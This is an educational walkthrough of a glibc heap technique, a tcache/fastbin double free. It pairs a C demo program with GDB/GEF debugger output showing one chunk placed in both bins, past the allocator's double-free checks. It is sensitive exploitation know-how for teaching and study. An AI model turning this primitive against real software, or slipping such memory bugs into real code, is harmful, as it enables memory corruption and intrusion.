# tcache double free pass

So in this instance, we will see another instance where we can successfully execute a double free, bypassing checks to detect it.

Here is the code for the program:

```
#include <stdio.h>
#include <stdlib.h>

#define CHUNK_SIZE0 0x70

void main() {
    long *chunk0,
            *chunk1,
            *chunk2,
            *chunk3,
            *chunk4,
            *chunk5,
            *chunk6,
            *chunk7,
            *chunk8;

    printf("So, we will now execute a double free, bypassing the checks in place.\n");
    printf("Both the tcache and the fastbin have checks in place, in order to detect double frees.\n");
    printf("However the fastbin double free check only works for if the chunk has been inserted into the fastbin.\n");
    printf("If the chunk has been inserted into a different bin, it won't have a chance to detect a double free (there are other ways to bypass it).\n");
    printf("It works similarly with the tcache, where it can't detect freed chunks in other bins.\n");
    printf("As such, we will free a chunk twice via inserting it into the fastbin first, then into the tcache.\n");
    printf("Let's allocate our chunks!\n\n");

    chunk0 = malloc(CHUNK_SIZE0);
    chunk1 = malloc(CHUNK_SIZE0);
    chunk2 = malloc(CHUNK_SIZE0);
    chunk3 = malloc(CHUNK_SIZE0);
    chunk4 = malloc(CHUNK_SIZE0);
    chunk5 = malloc(CHUNK_SIZE0);
    chunk6 = malloc(CHUNK_SIZE0);
    chunk7 = malloc(CHUNK_SIZE0);
    malloc(CHUNK_SIZE0);

    printf("Since we are inserting chunks into the fastbin, we need to fill up the corresponding tcache bin first.\n");
    printf("Let's go ahead and fill up the tcache bin, and insert a chunk into the fastbin!\n\n");

    free(chunk0);
    free(chunk1);
    free(chunk2);
    free(chunk3);
    free(chunk4);
    free(chunk5);
    free(chunk6);
    free(chunk7);

    printf("Now let's go ahead and allocate a chunk from the tcache to make space for the %p chunk!\n\n", chunk7);

    malloc(CHUNK_SIZE0);

    printf("Now let's free our %p chunk again, to insert it into the tcache, and execute a double free!\n\n", chunk7);

    free(chunk7);

    printf("Now that we've inserted the same chunk into both the fastbin and tcache, let's allocate it twice!\n");
    printf("Now by inserting it into the tcache too, we've changed the next ptr of the fastbin.\n");
    printf("Depending on what happens, this can cause problems.\n");
}
```

## Walkthrough

So first off, how is this premise working? Both the fastbin, and the tcache have checks in place in order to detect double frees. The thing is, the double free checks are for chunks of those particular bin types. So the tcache double free check will only be able to detect another tcache freed chunk, since it checks for the tcache key. The fastbin double free check, is that the new chunk to be inserted is not the same as the old fastbin head. As such, the fastbin double free check cannot detect that a chunk has been inserted into the tcache and vice versa. This is what we are going to leverage.

So basically we are going to insert a chunk into the fastbin, then into the tcache. This will enable us to free the same chunk twice:

Let's see this in action:

```
$   gdb ./tcache_fastbin_double
GNU gdb (Ubuntu 12.0.90-0ubuntu1) 12.0.90
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
88 commands loaded and 5 functions added for GDB 12.0.90 in 0.00ms using Python engine 3.10
Reading symbols from ./tcache_fastbin_double...
(No debugging symbols found in ./tcache_fastbin_double)
gef➤  disas main
Dump of assembler code for function main:
   0x00000000000011a9 <+0>: endbr64
   0x00000000000011ad <+4>: push   rbp
   0x00000000000011ae <+5>: mov rbp,rsp
   0x00000000000011b1 <+8>: sub rsp,0x40
   0x00000000000011b5 <+12>:    lea rax,[rip+0xe4c]     # 0x2008
   0x00000000000011bc <+19>:    mov rdi,rax
   0x00000000000011bf <+22>:    call   0x1090 <puts@plt>
   0x00000000000011c4 <+27>:    lea rax,[rip+0xe85]     # 0x2050
   0x00000000000011cb <+34>:    mov rdi,rax
   0x00000000000011ce <+37>:    call   0x1090 <puts@plt>
   0x00000000000011d3 <+42>:    lea rax,[rip+0xece]     # 0x20a8
   0x00000000000011da <+49>:    mov rdi,rax
   0x00000000000011dd <+52>:    call   0x1090 <puts@plt>
   0x00000000000011e2 <+57>:    lea rax,[rip+0xf27]     # 0x2110
   0x00000000000011e9 <+64>:    mov rdi,rax
   0x00000000000011ec <+67>:    call   0x1090 <puts@plt>
   0x00000000000011f1 <+72>:    lea rax,[rip+0xfa8]     # 0x21a0
   0x00000000000011f8 <+79>:    mov rdi,rax
   0x00000000000011fb <+82>:    call   0x1090 <puts@plt>
   0x0000000000001200 <+87>:    lea rax,[rip+0xff1]     # 0x21f8
   0x0000000000001207 <+94>:    mov rdi,rax
   0x000000000000120a <+97>:    call   0x1090 <puts@plt>
   0x000000000000120f <+102>:   lea rax,[rip+0x1045]        # 0x225b
   0x0000000000001216 <+109>:   mov rdi,rax
   0x0000000000001219 <+112>:   call   0x1090 <puts@plt>
   0x000000000000121e <+117>:   mov edi,0x70
   0x0000000000001223 <+122>:   call   0x10b0 <malloc@plt>
   0x0000000000001228 <+127>:   mov QWORD PTR [rbp-0x40],rax
   0x000000000000122c <+131>:   mov edi,0x70
   0x0000000000001231 <+136>:   call   0x10b0 <malloc@plt>
   0x0000000000001236 <+141>:   mov QWORD PTR [rbp-0x38],rax
   0x000000000000123a <+145>:   mov edi,0x70
   0x000000000000123f <+150>:   call   0x10b0 <malloc@plt>
   0x0000000000001244 <+155>:   mov QWORD PTR [rbp-0x30],rax
   0x0000000000001248 <+159>:   mov edi,0x70
   0x000000000000124d <+164>:   call   0x10b0 <malloc@plt>
   0x0000000000001252 <+169>:   mov QWORD PTR [rbp-0x28],rax
   0x0000000000001256 <+173>:   mov edi,0x70
   0x000000000000125b <+178>:   call   0x10b0 <malloc@plt>
   0x0000000000001260 <+183>:   mov QWORD PTR [rbp-0x20],rax
   0x0000000000001264 <+187>:   mov edi,0x70
   0x0000000000001269 <+192>:   call   0x10b0 <malloc@plt>
   0x000000000000126e <+197>:   mov QWORD PTR [rbp-0x18],rax
   0x0000000000001272 <+201>:   mov edi,0x70
   0x0000000000001277 <+206>:   call   0x10b0 <malloc@plt>
   0x000000000000127c <+211>:   mov QWORD PTR [rbp-0x10],rax
   0x0000000000001280 <+215>:   mov edi,0x70
   0x0000000000001285 <+220>:   call   0x10b0 <malloc@plt>
   0x000000000000128a <+225>:   mov QWORD PTR [rbp-0x8],rax
   0x000000000000128e <+229>:   mov edi,0x70
   0x0000000000001293 <+234>:   call   0x10b0 <malloc@plt>
   0x0000000000001298 <+239>:   lea rax,[rip+0xfd9]     # 0x2278
   0x000000000000129f <+246>:   mov rdi,rax
   0x00000000000012a2 <+249>:   call   0x1090 <puts@plt>
   0x00000000000012a7 <+254>:   lea rax,[rip+0x1032]        # 0x22e0
   0x00000000000012ae <+261>:   mov rdi,rax
   0x00000000000012b1 <+264>:   call   0x1090 <puts@plt>
   0x00000000000012b6 <+269>:   mov rax,QWORD PTR [rbp-0x40]
   0x00000000000012ba <+273>:   mov rdi,rax
   0x00000000000012bd <+276>:   call   0x1080 <free@plt>
   0x00000000000012c2 <+281>:   mov rax,QWORD PTR [rbp-0x38]
   0x00000000000012c6 <+285>:   mov rdi,rax
   0x00000000000012c9 <+288>:   call   0x1080 <free@plt>
   0x00000000000012ce <+293>:   mov rax,QWORD PTR [rbp-0x30]
   0x00000000000012d2 <+297>:   mov rdi,rax
   0x00000000000012d5 <+300>:   call   0x1080 <free@plt>
   0x00000000000012da <+305>:   mov rax,QWORD PTR [rbp-0x28]
   0x00000000000012de <+309>:   mov rdi,rax
   0x00000000000012e1 <+312>:   call   0x1080 <free@plt>
   0x00000000000012e6 <+317>:   mov rax,QWORD PTR [rbp-0x20]
   0x00000000000012ea <+321>:   mov rdi,rax
   0x00000000000012ed <+324>:   call   0x1080 <free@plt>
   0x00000000000012f2 <+329>:   mov rax,QWORD PTR [rbp-0x18]
   0x00000000000012f6 <+333>:   mov rdi,rax
   0x00000000000012f9 <+336>:   call   0x1080 <free@plt>
   0x00000000000012fe <+341>:   mov rax,QWORD PTR [rbp-0x10]
   0x0000000000001302 <+345>:   mov rdi,rax
   0x0000000000001305 <+348>:   call   0x1080 <free@plt>
   0x000000000000130a <+353>:   mov rax,QWORD PTR [rbp-0x8]
   0x000000000000130e <+357>:   mov rdi,rax
   0x0000000000001311 <+360>:   call   0x1080 <free@plt>
   0x0000000000001316 <+365>:   mov rax,QWORD PTR [rbp-0x8]
   0x000000000000131a <+369>:   mov rsi,rax
   0x000000000000131d <+372>:   lea rax,[rip+0x1014]        # 0x2338
   0x0000000000001324 <+379>:   mov rdi,rax
   0x0000000000001327 <+382>:   mov eax,0x0
   0x000000000000132c <+387>:   call   0x10a0 <printf@plt>
   0x0000000000001331 <+392>:   mov edi,0x70
   0x0000000000001336 <+397>:   call   0x10b0 <malloc@plt>
   0x000000000000133b <+402>:   mov rax,QWORD PTR [rbp-0x8]
   0x000000000000133f <+406>:   mov rsi,rax
   0x0000000000001342 <+409>:   lea rax,[rip+0x104f]        # 0x2398
   0x0000000000001349 <+416>:   mov rdi,rax
   0x000000000000134c <+419>:   mov eax,0x0
   0x0000000000001351 <+424>:   call   0x10a0 <printf@plt>
   0x0000000000001356 <+429>:   mov rax,QWORD PTR [rbp-0x8]
   0x000000000000135a <+433>:   mov rdi,rax
   0x000000000000135d <+436>:   call   0x1080 <free@plt>
   0x0000000000001362 <+441>:   lea rax,[rip+0x108f]        # 0x23f8
   0x0000000000001369 <+448>:   mov rdi,rax
   0x000000000000136c <+451>:   call   0x1090 <puts@plt>
   0x0000000000001371 <+456>:   lea rax,[rip+0x10e8]        # 0x2460
   0x0000000000001378 <+463>:   mov rdi,rax
   0x000000000000137b <+466>:   call   0x1090 <puts@plt>
   0x0000000000001380 <+471>:   lea rax,[rip+0x1131]        # 0x24b8
   0x0000000000001387 <+478>:   mov rdi,rax
   0x000000000000138a <+481>:   call   0x1090 <puts@plt>
   0x000000000000138f <+486>:   nop
   0x0000000000001390 <+487>:   leave  
   0x0000000000001391 <+488>:   ret    
End of assembler dump.
gef➤  b *main+365
Breakpoint 1 at 0x1316
gef➤  b *main+436
Breakpoint 2 at 0x135d
gef➤  r
Starting program: /Hackery/shogun/pwn_demos/tcache/tcache_fastbin_double/tcache_fastbin_double
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
So, we will now execute a double free, bypassing the checks in place.
Both the tcache and the fastbin have checks in place, in order to detect double frees.
However the fastbin double free check only works for if the chunk has been inserted into the fastbin.
If the chunk has been inserted into a different bin, it won't have a chance to detect a double free (there are other ways to bypass it).
It works similarly with the tcache, where it can't detect freed chunks in other bins.
As such, we will free a chunk twice via inserting it into the fastbin first, then into the tcache.
Let's allocate our chunks!

Since we are inserting chunks into the fastbin, we need to fill up the corresponding tcache bin first.
Let's go ahead and fill up the tcache bin, and insert a chunk into the fastbin!


Breakpoint 1, 0x0000555555555316 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0             
$rbx   : 0x0             
$rcx   : 0x555555559     
$rdx   : 0x0             
$rsp   : 0x00007fffffffdf60  →  0x00005555555596b0  →  0x0000000555555559
$rbp   : 0x00007fffffffdfa0  →  0x0000000000000001
$rsi   : 0x0000555555559010  →  0x0000000000000000
$rdi   : 0x7             
$rip   : 0x0000555555555316  →  <main+365> mov rax, QWORD PTR [rbp-0x8]
$r8 : 0x0000555555559a30  →  0x0000000555555559
$r9 : 0x0000555555559ab0  →  0x0000000000000000
$r10   : 0x77            
$r11   : 0x8f13ce32a12e110f
$r12   : 0x00007fffffffe0b8  →  0x00007fffffffe3b7  →  "/Hackery/shogun/pwn_demos/tcache/tcache_f[...]"
$r13   : 0x00005555555551a9  →  <main+0> endbr64
$r14   : 0x0000555555557da8  →  0x0000555555555160  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd040  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf60│+0x0000: 0x00005555555596b0  →  0x0000000555555559   ← $rsp
0x00007fffffffdf68│+0x0008: 0x0000555555559730  →  0x000055500000c3e9
0x00007fffffffdf70│+0x0010: 0x00005555555597b0  →  0x000055500000c269
0x00007fffffffdf78│+0x0018: 0x0000555555559830  →  0x000055500000c2e9
0x00007fffffffdf80│+0x0020: 0x00005555555598b0  →  0x000055500000cd69
0x00007fffffffdf88│+0x0028: 0x0000555555559930  →  0x000055500000cde9
0x00007fffffffdf90│+0x0030: 0x00005555555599b0  →  0x000055500000cc69
0x00007fffffffdf98│+0x0038: 0x0000555555559a30  →  0x0000000555555559
──────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55555555530a <main+353>    mov rax, QWORD PTR [rbp-0x8]
   0x55555555530e <main+357>    mov rdi, rax
   0x555555555311 <main+360>    call   0x555555555080 <free@plt>
 → 0x555555555316 <main+365>    mov rax, QWORD PTR [rbp-0x8]
   0x55555555531a <main+369>    mov rsi, rax
   0x55555555531d <main+372>    lea rax, [rip+0x1014]       # 0x555555556338
   0x555555555324 <main+379>    mov rdi, rax
   0x555555555327 <main+382>    mov eax, 0x0
   0x55555555532c <main+387>    call   0x5555555550a0 <printf@plt>
──────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "tcache_fastbin_", stopped 0x555555555316 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555316 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap bins
──────────────────────────────────────── Tcachebins for thread 1 ────────────────────────────────────────
Tcachebins[idx=6, size=0x80, count=7] ←  Chunk(addr=0x5555555599b0, size=0x80, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555559930, size=0x80, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5555555598b0, size=0x80, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555559830, size=0x80, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5555555597b0, size=0x80, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555559730, size=0x80, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5555555596b0, size=0x80, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
───────────────────────────────── Fastbins for arena at 0x7ffff7e19c80 ─────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80]  ←  Chunk(addr=0x555555559a30, size=0x80, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
─────────────────────────────── Unsorted Bin for arena at 0x7ffff7e19c80 ───────────────────────────────
[+] Found 0 chunks in unsorted bin.
──────────────────────────────── Small Bins for arena at 0x7ffff7e19c80 ────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
──────────────────────────────── Large Bins for arena at 0x7ffff7e19c80 ────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
```

So we see the tcache bin is full, which corresponds to the fastbin which has a chunk in it. Let's go ahead and allocate a chunk from that tcache bin, and insert the chunk that is in the fastbin into the tcache:

```
gef➤  c
Continuing.
Now let's go ahead and allocate a chunk from the tcache to make space for the 0x555555559a30 chunk!

Now let's free our 0x555555559a30 chunk again, to insert it into the tcache, and execute a double free!


Breakpoint 2, 0x000055555555535d in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0000555555559a30  →  0x0000000555555559
$rbx   : 0x0             
$rcx   : 0x1             
$rdx   : 0x0             
$rsp   : 0x00007fffffffdf60  →  0x00005555555596b0  →  0x0000000555555559
$rbp   : 0x00007fffffffdfa0  →  0x0000000000000001
$rsi   : 0x00005555555592a0  →  "Now let's free our 0x555555559a30 chunk again, to [...]"
$rdi   : 0x0000555555559a30  →  0x0000000555555559
$rip   : 0x000055555555535d  →  <main+436> call 0x555555555080 <free@plt>
$r8 : 0x0            
$r9 : 0x00007fffffffde2c  →  "555555559a30"
$r10   : 0x0             
$r11   : 0x246           
$r12   : 0x00007fffffffe0b8  →  0x00007fffffffe3b7  →  "/Hackery/shogun/pwn_demos/tcache/tcache_f[...]"
$r13   : 0x00005555555551a9  →  <main+0> endbr64
$r14   : 0x0000555555557da8  →  0x0000555555555160  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd040  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf60│+0x0000: 0x00005555555596b0  →  0x0000000555555559   ← $rsp
0x00007fffffffdf68│+0x0008: 0x0000555555559730  →  0x000055500000c3e9
0x00007fffffffdf70│+0x0010: 0x00005555555597b0  →  0x000055500000c269
0x00007fffffffdf78│+0x0018: 0x0000555555559830  →  0x000055500000c2e9
0x00007fffffffdf80│+0x0020: 0x00005555555598b0  →  0x000055500000cd69
0x00007fffffffdf88│+0x0028: 0x0000555555559930  →  0x000055500000cde9
0x00007fffffffdf90│+0x0030: 0x00005555555599b0  →  0x000055500000cc69
0x00007fffffffdf98│+0x0038: 0x0000555555559a30  →  0x0000000555555559
──────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555351 <main+424>    call   0x5555555550a0 <printf@plt>
   0x555555555356 <main+429>    mov rax, QWORD PTR [rbp-0x8]
   0x55555555535a <main+433>    mov rdi, rax
 → 0x55555555535d <main+436>    call   0x555555555080 <free@plt>
   ↳  0x555555555080 <free@plt+0>   endbr64
    0x555555555084 <free@plt+4>     bnd jmp QWORD PTR [rip+0x2f2d]      # 0x555555557fb8 <free@got.plt>
    0x55555555508b <free@plt+11>    nop DWORD PTR [rax+rax*1+0x0]
    0x555555555090 <puts@plt+0>     endbr64
    0x555555555094 <puts@plt+4>     bnd jmp QWORD PTR [rip+0x2f25]      # 0x555555557fc0 <puts@got.plt>
    0x55555555509b <puts@plt+11>    nop DWORD PTR [rax+rax*1+0x0]
──────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
free@plt (
   $rdi = 0x0000555555559a30 → 0x0000000555555559
)
──────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "tcache_fastbin_", stopped 0x55555555535d in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55555555535d → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p $rdi
$1 = 0x555555559a30
gef➤  heap bins
──────────────────────────────────────── Tcachebins for thread 1 ────────────────────────────────────────
Tcachebins[idx=6, size=0x80, count=6] ←  Chunk(addr=0x555555559930, size=0x80, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5555555598b0, size=0x80, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555559830, size=0x80, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5555555597b0, size=0x80, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555559730, size=0x80, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5555555596b0, size=0x80, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
───────────────────────────────── Fastbins for arena at 0x7ffff7e19c80 ─────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80]  ←  Chunk(addr=0x555555559a30, size=0x80, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
─────────────────────────────── Unsorted Bin for arena at 0x7ffff7e19c80 ───────────────────────────────
[+] Found 0 chunks in unsorted bin.
──────────────────────────────── Small Bins for arena at 0x7ffff7e19c80 ────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
──────────────────────────────── Large Bins for arena at 0x7ffff7e19c80 ────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  si
0x0000555555555080 in free@plt ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0000555555559a30  →  0x0000000555555559
$rbx   : 0x0             
$rcx   : 0x1             
$rdx   : 0x0             
$rsp   : 0x00007fffffffdf58  →  0x0000555555555362  →  <main+441> lea rax, [rip+0x108f]     # 0x5555555563f8
$rbp   : 0x00007fffffffdfa0  →  0x0000000000000001
$rsi   : 0x00005555555592a0  →  "Now let's free our 0x555555559a30 chunk again, to [...]"
$rdi   : 0x0000555555559a30  →  0x0000000555555559
$rip   : 0x0000555555555080  →  <free@plt+0> endbr64
$r8 : 0x0            
$r9 : 0x00007fffffffde2c  →  "555555559a30"
$r10   : 0x0             
$r11   : 0x246           
$r12   : 0x00007fffffffe0b8  →  0x00007fffffffe3b7  →  "/Hackery/shogun/pwn_demos/tcache/tcache_f[...]"
$r13   : 0x00005555555551a9  →  <main+0> endbr64
$r14   : 0x0000555555557da8  →  0x0000555555555160  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd040  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf58│+0x0000: 0x0000555555555362  →  <main+441> lea rax, [rip+0x108f]     # 0x5555555563f8  ← $rsp
0x00007fffffffdf60│+0x0008: 0x00005555555596b0  →  0x0000000555555559
0x00007fffffffdf68│+0x0010: 0x0000555555559730  →  0x000055500000c3e9
0x00007fffffffdf70│+0x0018: 0x00005555555597b0  →  0x000055500000c269
0x00007fffffffdf78│+0x0020: 0x0000555555559830  →  0x000055500000c2e9
0x00007fffffffdf80│+0x0028: 0x00005555555598b0  →  0x000055500000cd69
0x00007fffffffdf88│+0x0030: 0x0000555555559930  →  0x000055500000cde9
0x00007fffffffdf90│+0x0038: 0x00005555555599b0  →  0x000055500000cc69
──────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555070 <__cxa_finalize@plt+0> endbr64
   0x555555555074 <__cxa_finalize@plt+4> bnd    jmp QWORD PTR [rip+0x2f7d]      # 0x555555557ff8
   0x55555555507b <__cxa_finalize@plt+11> nop   DWORD PTR [rax+rax*1+0x0]
 → 0x555555555080 <free@plt+0>  endbr64
   0x555555555084 <free@plt+4>  bnd jmp QWORD PTR [rip+0x2f2d]      # 0x555555557fb8 <free@got.plt>
   0x55555555508b <free@plt+11> nop DWORD PTR [rax+rax*1+0x0]
   0x555555555090 <puts@plt+0>  endbr64
   0x555555555094 <puts@plt+4>  bnd jmp QWORD PTR [rip+0x2f25]      # 0x555555557fc0 <puts@got.plt>
   0x55555555509b <puts@plt+11> nop DWORD PTR [rax+rax*1+0x0]
──────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "tcache_fastbin_", stopped 0x555555555080 in free@plt (), reason: SINGLE STEP
────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555080 → free@plt()
[#1] 0x555555555362 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  finish
Run till exit from #0  0x0000555555555080 in free@plt ()
0x0000555555555362 in main ()


[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0             
$rbx   : 0x0             
$rcx   : 0x6             
$rdx   : 0x55500000cc69    
$rsp   : 0x00007fffffffdf60  →  0x00005555555596b0  →  0x0000000555555559
$rbp   : 0x00007fffffffdfa0  →  0x0000000000000001
$rsi   : 0x0000555555559010  →  0x0000000000000000
$rdi   : 0x7             
$rip   : 0x0000555555555362  →  <main+441> lea rax, [rip+0x108f]        # 0x5555555563f8
$r8 : 0x0000555555559a30  →  0x000055500000cc69
$r9 : 0x00007fffffffde2c  →  "555555559a30"
$r10   : 0x0             
$r11   : 0x8f13ce32a12e110f
$r12   : 0x00007fffffffe0b8  →  0x00007fffffffe3b7  →  "/Hackery/shogun/pwn_demos/tcache/tcache_f[...]"
$r13   : 0x00005555555551a9  →  <main+0> endbr64
$r14   : 0x0000555555557da8  →  0x0000555555555160  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd040  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf60│+0x0000: 0x00005555555596b0  →  0x0000000555555559   ← $rsp
0x00007fffffffdf68│+0x0008: 0x0000555555559730  →  0x000055500000c3e9
0x00007fffffffdf70│+0x0010: 0x00005555555597b0  →  0x000055500000c269
0x00007fffffffdf78│+0x0018: 0x0000555555559830  →  0x000055500000c2e9
0x00007fffffffdf80│+0x0020: 0x00005555555598b0  →  0x000055500000cd69
0x00007fffffffdf88│+0x0028: 0x0000555555559930  →  0x000055500000cde9
0x00007fffffffdf90│+0x0030: 0x00005555555599b0  →  0x000055500000cc69
0x00007fffffffdf98│+0x0038: 0x0000555555559a30  →  0x000055500000cc69
──────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555356 <main+429>    mov rax, QWORD PTR [rbp-0x8]
   0x55555555535a <main+433>    mov rdi, rax
   0x55555555535d <main+436>    call   0x555555555080 <free@plt>
 → 0x555555555362 <main+441>    lea rax, [rip+0x108f]       # 0x5555555563f8
   0x555555555369 <main+448>    mov rdi, rax
   0x55555555536c <main+451>    call   0x555555555090 <puts@plt>
   0x555555555371 <main+456>    lea rax, [rip+0x10e8]       # 0x555555556460
   0x555555555378 <main+463>    mov rdi, rax
   0x55555555537b <main+466>    call   0x555555555090 <puts@plt>
──────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "tcache_fastbin_", stopped 0x555555555362 in main (), reason: TEMPORARY BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555362 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap bins
──────────────────────────────────────── Tcachebins for thread 1 ────────────────────────────────────────
Tcachebins[idx=6, size=0x80, count=7] ←  Chunk(addr=0x555555559a30, size=0x80, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555559930, size=0x80, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5555555598b0, size=0x80, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555559830, size=0x80, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5555555597b0, size=0x80, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555559730, size=0x80, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5555555596b0, size=0x80, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
───────────────────────────────── Fastbins for arena at 0x7ffff7e19c80 ─────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80]  ←  Chunk(addr=0x555555559a30, size=0x80, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555559940, size=0x8f13ce32a12e1108, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) [incorrect fastbin_index]  ←  [Corrupted chunk at 0x555555559940]
─────────────────────────────── Unsorted Bin for arena at 0x7ffff7e19c80 ───────────────────────────────
[+] Found 0 chunks in unsorted bin.
──────────────────────────────── Small Bins for arena at 0x7ffff7e19c80 ────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
──────────────────────────────── Large Bins for arena at 0x7ffff7e19c80 ────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  c
Continuing.
Now that we've inserted the same chunk into both the fastbin and tcache, let's allocate it twice!
